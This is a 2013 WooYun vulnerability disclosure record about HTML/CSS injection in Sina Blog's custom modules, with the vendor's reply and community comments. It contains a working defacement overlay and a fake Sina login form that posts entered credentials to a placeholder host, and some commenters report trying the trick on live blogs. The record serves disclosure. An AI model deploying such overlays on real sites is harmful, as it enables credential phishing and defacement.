{"id": 8922, "wybug_id": "wooyun-2013-035816", "wybug_title": "我是如何黑掉新浪博客的(可钓鱼)", "wybug_corp": "新浪", "wybug_author": "LaiX", "wybug_date": "2013-09-01 10:09", "wybug_open_date": "2013-10-16 10:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "设计不当", "设计错误", "搞笑有爱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-16：\t细节向公众公开  简要描述：  详细说明：  不知道算不算发现了一个革命性的漏洞先来看看这个页面\nhttp://blog.sina.com.cn/u/3636469737\n\n\n   漏洞证明：  我承认我标题党了.....- -我暂且把这个漏洞叫做 CSS样式劫持。其实这个\"黑掉\"只是一个恶作剧而已。先来看看这个\"黑页\"是怎么实现的先来到自定义模块\n\n又是这个自定义模块惹得祸啊这个地方可以自定义CSS样式，所以就出了大事。\n<table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>Hello Sina</h1></td></tr></tbody></table>\n我们在这里插入上面的代码，然后保存，刷新然后整个页面就被劫持，就出现了上面黑页的效果。那么仅仅只是挂个黑页恶作剧，好玩？我们来看看另外一种玩法为什么叫CSS劫持，因为它还可以冒充已经定义好的DIV窗口\n\n这不是登录窗口吗。我们拿到这个窗口的HTML代码\n<table id=\"_2381377975243257_panel\" class=\"CP_w\" style=\"left: 480px; top: 205px; z-index: 5000; position: absolute; opacity: 1;\"><thead id=\"_2381377975243257_titleBar\" style=\"cursor: move;\"><tr><th class=\"tLeft\"><span></span></th><th class=\"tMid\"><div class=\"bLyTop\"><strong id=\"_2381377975243257_titleName\">登录新浪博客</strong><cite><a id=\"_2381377975243257_btnClose\" href=\"#\" onclick=\"return false;\" class=\"CP_w_shut\" title=\"关闭\">关闭</a></cite></div></th><th class=\"tRight\"><span></span></th></tr></thead><tfoot><tr><td class=\"tLeft\"><span></span></td><td class=\"tMid\"><span></span></td><td class=\"tRight\"><span></span></td></tr></tfoot><tbody><tr><td class=\"tLeft\"><span></span></td><td class=\"tMid\" id=\"_2381377975243257_content\">\t\t<div class=\"CP_layercon2 passLoginItem\">\t\t\t<div>\t\t\t\t<div id=\"login_move_tip\" style=\"display:none;margin-bottom:12px\">可以使用新浪微博、邮箱、通行证的帐号进行登录</div>\t\t\t\t<div class=\"boxA\">登录名：\t\t\t\t\t<input tabindex=\"201\" type=\"text\" class=\"fm1\" style=\"width:215px;\" name=\"login_name\" id=\"login_name_d\">  <a style=\"font-size: 12px;\" href=\"http://login.sina.com.cn/signup/signupmail.php?entry=blog&amp;srcuid=3541956257&amp;src=blogicp\" target=\"_blank\">立即注册</a>\t\t\t\t</div>\t\t\t\t<div class=\"boxA\">密　码：\t\t\t\t\t<input tabindex=\"202\" type=\"password\" class=\"fm1\" style=\"width:215px;\" name=\"login_pass\" maxlength=\"16\" id=\"login_pass_d\">  <a style=\"font-size: 12px;\" href=\"http://login.sina.com.cn/getpass.html\" target=\"_blank\">找回密码</a>\t\t\t\t</div>\t\t\t\t<div id=\"login_ckimg\" class=\"boxA\" style=\"display:none\"> <p class=\"p_img\">验证码：                  \t<input type=\"text\" id=\"login_vcode\" name=\"login_vcode\" class=\"fm1\" size=\"10\" maxlength=\"5\">                  \t<img width=\"100\" align=\"absmiddle\" id=\"checkImg\" src=\"http://login.sina.com.cn/cgi/pin.php?r=40411377975241946&amp;s=0\"> <a href=\"javascript:;\" onclick=\"return false;\" style=\"font-size: 12px;\"><span id=\"reloadCode\">换一换</span></a></p> \t\t\t    </div>\t\t\t\t<div class=\"ErrTips\" id=\"login_div_error\"></div>\t\t\t\t<div class=\"boxB\"><p><input tabindex=\"203\" type=\"checkbox\" value=\"\" id=\"login_save\" checked=\"checked\"><label for=\"login_save\"> 记住登录状态</label></p><p id=\"login_save_tips\" style=\"color:#999;display:none;\">建议在网吧/公用电脑上取消该选项</p><p style=\"margin-top: 8px;\"><a id=\"login_button\" class=\"SG_aBtn SG_aBtnB SG_aBtn_sub\" href=\"javascript:;\" tabindex=\"204\"><cite>登录<input type=\"text\"></cite></a> </p></div>\t\t\t</div>\t\t\t<div class=\"connect_msn\" id=\"connect_msn\" style=\"position:relative;\">\t\t\t\t<span>使用 MSN 帐号登录博客</span>\t\t\t\t<a href=\"#\" onclick=\"Lib.checkAuthor();v7sendLog('48_01_36'); window.open('https://login.live.com/oauth20_authorize.srf?client_id=0000000040046F08&amp;redirect_uri=http%3A%2F%2Fcontrol.blog.sina.com.cn%2Fblog_rebuild%2Fmsn%2FmsnLoginCallBack.php&amp;response_type=code&amp;scope=wl.basic%20wl.signin%20wl.offline_access%20wl.share%20wl.emails','neww','left=500,top=250,height=400,width=440');msnrefreshWindow();\" style=\"background:transparent url(http://simg.sinajs.cn/blog7style/images/msn_login01.gif) no-repeat left top; width:70px; height:22px; line-height:22px; display:inline-block; text-align:left; text-indent:2em; text-decoration:none; color:white; font-weight:bold; font-size:14px;\">登录</a>\t\t\t</div>\t\t\t<a href=\"http://blog.sina.com.cn/s/blog_4b0f52990100miil.html\" target=\"_blank\" style=\"left:308px;position:relative;top:-24px;\">如何登录？</a>\t\t\t<div class=\"CP_lg_ad SG_j_linedot1\">\t\t\t\t<iframe id=\"login_ad\" src=\"http://blog.sina.com.cn/lm/iframe/71/2008/0731/21.html\" frameborder=\"0\" scrolling=\"no\" height=\"25\" width=\"auto\"></iframe>\t\t\t</div>\t\t</div></td><td class=\"tRight\"><span></span></td></tr></tbody></table>\n弄到刚刚的自定义模块中看看。\n\n一个钓鱼窗口就完整的出现在了我们的面前，不过它还不能工作。我们需要修改一下代码这里新浪并没有屏蔽掉<from>标签。所以我们只需要在源码里加上from就可以实现钓鱼效果。\n<table id=\"_9971377970387149_panel\" class=\"CP_w\" style=\"left: 480px; top: 205px; z-index: 5000; position: absolute; opacity: 1;\"><thead id=\"_9971377970387149_titleBar\" style=\"cursor: move;\"><tr><th class=\"tLeft\"><span></span></th><th class=\"tMid\"><div class=\"bLyTop\"><strong id=\"_9971377970387149_titleName\">登录新浪博客</strong><cite><a id=\"_9971377970387149_btnClose\" href=\"#\" onclick=\"return false;\" class=\"CP_w_shut\" title=\"关闭\">关闭</a></cite></div></th><th class=\"tRight\"><span></span></th></tr></thead><tfoot><tr><td class=\"tLeft\"><span></span></td><td class=\"tMid\"><span></span></td><td class=\"tRight\"><span></span></td></tr></tfoot><tbody><tr><td class=\"tLeft\"><span></span></td><td class=\"tMid\" id=\"_9971377970387149_content\">\t\t<div class=\"CP_layercon2 passLoginItem\">\t\t\t<div>\t\t\t\t<form name=\"input\" action=\"http://www.x.com/ok.php\" method=\"get\"><div id=\"login_move_tip\" style=\"display:none;margin-bottom:12px\">可以使用新浪微博、邮箱、通行证的帐号进行登录</div>\t\t\t\t<div class=\"boxA\">登录名：\t\t\t\t\t<input tabindex=\"201\" type=\"text\" class=\"fm1\" style=\"width:215px;\" name=\"login_name\" id=\"login_name_d\">  <a style=\"font-size: 12px;\" href=\"http://login.sina.com.cn/signup/signupmail.php?entry=blog&amp;srcuid=3636469737&amp;src=blogicp\" target=\"_blank\">立即注册</a>\t\t\t\t</div>\t\t\t\t<div class=\"boxA\">密　码：\t\t\t\t\t<input tabindex=\"202\" type=\"password\" class=\"fm1\" style=\"width:215px;\" name=\"login_pass\" maxlength=\"16\" id=\"login_pass_d\">  <a style=\"font-size: 12px;\" href=\"http://login.sina.com.cn/getpass.html\" target=\"_blank\">找回密码</a>\t\t\t\t</div>\t\t\t\t<div id=\"login_ckimg\" class=\"boxA\" style=\"display:none\"> <p class=\"p_img\">验证码：                  \t<input type=\"text\" id=\"login_vcode\" name=\"login_vcode\" class=\"fm1\" size=\"10\" maxlength=\"5\">                  \t<img width=\"100\" align=\"absmiddle\" id=\"checkImg\" src=\"http://login.sina.com.cn/cgi/pin.php?r=62971377970385056&amp;s=0\"> <a href=\"javascript:;\" onclick=\"return false;\" style=\"font-size: 12px;\"><span id=\"reloadCode\">换一换</span></a></p> \t\t\t    </div>\t\t\t\t<div class=\"ErrTips\" id=\"login_div_error\"></div>\t\t\t\t<div class=\"boxB\"><p><input tabindex=\"203\" type=\"checkbox\" value=\"\" id=\"login_save\" checked=\"checked\"><label for=\"login_save\"> 记住登录状态</label></p><p id=\"login_save_tips\" style=\"color:#999;display:none;\">建议在网吧/公用电脑上取消该选项</p><p style=\"margin-top: 8px;\"><input type=\"submit\" value=\"登录\"> </p></div>\t\t\t</div>\t\t\t<div class=\"connect_msn\" id=\"connect_msn\" style=\"position:relative;\">\t\t\t\t<span>使用 MSN 帐号登录博客</span>\t\t\t\t<a href=\"#\" onclick=\"Lib.checkAuthor();v7sendLog('48_01_36'); window.open('https://login.live.com/oauth20_authorize.srf?client_id=0000000040046F08&amp;redirect_uri=http%3A%2F%2Fcontrol.blog.sina.com.cn%2Fblog_rebuild%2Fmsn%2FmsnLoginCallBack.php&amp;response_type=code&amp;scope=wl.basic%20wl.signin%20wl.offline_access%20wl.share%20wl.emails','neww','left=500,top=250,height=400,width=440');msnrefreshWindow();\" style=\"background:transparent url(http://simg.sinajs.cn/blog7style/images/msn_login01.gif) no-repeat left top; width:70px; height:22px; line-height:22px; display:inline-block; text-align:left; text-indent:2em; text-decoration:none; color:white; font-weight:bold; font-size:14px;\">登录</a>\t\t\t</div>\t</form>\t\t<a href=\"http://blog.sina.com.cn/s/blog_4b0f52990100miil.html\" target=\"_blank\" style=\"left:308px;position:relative;top:-24px;\">如何登录？</a>\t\t\t<div class=\"CP_lg_ad SG_j_linedot1\">\t\t\t\t<iframe id=\"login_ad\" src=\"http://blog.sina.com.cn/lm/iframe/71/2008/0731/21.html\" frameborder=\"0\" scrolling=\"no\" height=\"25\" width=\"auto\"></iframe>\t\t\t</div>\t\t</div></td><td class=\"tRight\"><span></span></td></tr></tbody></table>\n\n\n   修复方案：  禁用一些css的样式   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-09-01 19:59 厂商回复： 感谢关注新浪安全，思路挺不错， 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-01 10:21 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  我信洞主    \n     2013-09-01 10:26 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  +1    \n     2013-09-01 10:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @niliu 我不信。    \n     2013-09-01 11:03 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  不信+1    \n     2013-09-01 11:09 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  真的好黑啊    \n     2013-09-01 11:17 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  我信洞主！    \n     2013-09-01 11:36 |    \t\trootnmxx \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n  我不信洞主+1    \n     2013-09-01 11:37 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  猜我信不信 。。 快猜。。    \n     2013-09-01 12:21 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  马克    \n     2013-09-01 12:31 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  信or不信    \n     2013-09-01 13:34 |    \t\t‫‌ \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:14        )\t\t \n  <table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>Hello Sina</h1></td></tr></tbody></table>哦。。呵呵。。。    \n     2013-09-01 13:34 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  好黑啊...    \n     2013-09-01 14:01 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  我是如何黑掉新浪博客的(可吃鱼)    \n     2013-09-01 14:12 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  我是如何黑掉QQ空间的    \n     2013-09-01 14:12 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  @M4sk 你懂不？    \n     2013-09-01 14:19 |    \t\tLauRen \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 苦逼屌丝一枚。)\t\t \n  mark    \n     2013-09-01 14:26 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  出现在 自定义组件的地方？    \n     2013-09-01 14:35 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  mark    \n     2013-09-01 14:35 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  mark    \n     2013-09-01 14:42 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  http://blog.sina.com.cn/u/3537027933 成功了    \n     2013-09-01 14:44 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @艾特绅 高端~求透露一下    \n     2013-09-01 15:11 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  http://blog.sina.com.cn/u/1665982522改不回去了 艹    \n     2013-09-01 15:22 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  @北洋贱队 可以改    \n     2013-09-01 16:11 |    \t\tLenwood \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | test)\t\t \n  http://blog.sina.com.cn/u/1762948335    \n     2013-09-01 17:54 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:16        )\t\t \n  @冷静 添加自定义组件，加样式代码就行    \n     2013-09-01 18:27 |    \t\t新浪(乌云厂商)\t\t \n  这个简要描述，有点不合适吧    \n     2013-09-01 18:49 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @新浪 我刚刚到家，失误失误..马上修改    \n     2013-09-01 19:06 |    \t\t小贱 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 我是一只小菜鸟啊 飞呀飞呀飞)\t\t \n  吊爆了。。。http://blog.sina.com.cn/u/2045174667    \n     2013-09-01 19:16 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  各位有点白帽子精神别传播也别修改了， @xsser 来删了评论吧    \n     2013-09-01 19:21 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @新浪 。。。原来你一直都在啊。、。    \n     2013-09-01 20:24 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @plane636 谢谢了.我去测试QQ空间发现不行..    \n     2013-09-01 21:25 |    \t\t小贱 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 我是一只小菜鸟啊 飞呀飞呀飞)\t\t \n  @冷静 和我一样。。。我连百度都试了 没用。。    \n     2013-09-01 22:41 |    \t\tLenwood \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | test)\t\t \n  修复了，我擦。    \n     2013-09-02 19:35 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @Lenwood 修复了不会再绕吗。    \n     2013-10-08 09:02 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  漏洞利用方式很赞    \n     2013-10-16 11:52 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  5分  真心渣渣了    \n     2013-10-16 13:53 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @小威  是啊很渣的，没想到还能得5分    \n     2013-10-16 14:43 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  @LaiX 我是说性浪渣渣了 ~ 非你    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}